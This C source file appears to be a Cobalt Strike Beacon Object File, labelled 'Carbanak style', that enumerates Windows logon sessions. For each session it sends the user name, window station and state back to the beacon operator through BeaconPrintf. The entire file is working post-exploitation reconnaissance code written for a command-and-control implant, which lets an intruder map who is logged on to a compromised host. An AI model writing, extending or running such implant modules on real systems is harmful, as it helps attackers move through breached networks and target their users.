/*
 * session_spy.c - Active logon sessions + network sessions
 * Carbanak style session enumeration
 */
#include <windows.h>
#include <lm.h>
#include <wtsapi32.h>
#include <stdio.h>
#include "beacon.h"

DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI WTSAPI32$WTSEnumerateSessionsA(HANDLE, DWORD, DWORD, PWTS_SESSION_INFO*, DWORD*);
DECLSPEC_IMPORT WINBASEAPI BOOL WINAPI WTSAPI32$WTSQuerySessionInformationA(HANDLE, DWORD, WTS_INFO_CLASS, LPSTR*, DWORD*);
DECLSPEC_IMPORT WINBASEAPI VOID WINAPI WTSAPI32$WTSFreeMemory(PVOID);

void go(char* args, int args_len)
{
    (void)args; (void)args_len;

    PWTS_SESSION_INFO pSessions = NULL;
    DWORD count = 0;

    if (!WTSAPI32$WTSEnumerateSessionsA(WTS_CURRENT_SERVER_HANDLE, 0, 1, &pSessions, &count)) {
        BeaconPrintf(CALLBACK_OUTPUT, "Failed to enumerate sessions");
        return;
    }

    BeaconPrintf(CALLBACK_OUTPUT, "=== Active Sessions (%lu) ===", count);
    BeaconPrintf(CALLBACK_OUTPUT, "%-8s %-15s %-20s %-12s", "Session", "Winsta", "User", "State");

    for (DWORD i = 0; i < count; i++) {
        LPSTR userName = NULL;
        DWORD userNameLen = 0;
        LPSTR winStation = NULL;
        DWORD winStationLen = 0;

        WTSAPI32$WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE,
            pSessions[i].SessionId, WTSUserName, &userName, &userNameLen);
        WTSAPI32$WTSQuerySessionInformationA(WTS_CURRENT_SERVER_HANDLE,
            pSessions[i].SessionId, WTSWinStationName, &winStation, &winStationLen);

        const char* state = "Unknown";
        switch (pSessions[i].State) {
            case 0: state = "Active"; break;
            case 1: state = "Connected"; break;
            case 4: state = "Disconnected"; break;
        }

        BeaconPrintf(CALLBACK_OUTPUT, "%-8lu %-15s %-20s %-12s",
            pSessions[i].SessionId,
            (winStation && winStation[0]) ? winStation : "(none)",
            (userName && userName[0]) ? userName : "(none)",
            state);

        if (userName) WTSAPI32$WTSFreeMemory(userName);
        if (winStation) WTSAPI32$WTSFreeMemory(winStation);
    }

    WTSAPI32$WTSFreeMemory(pSessions);
}
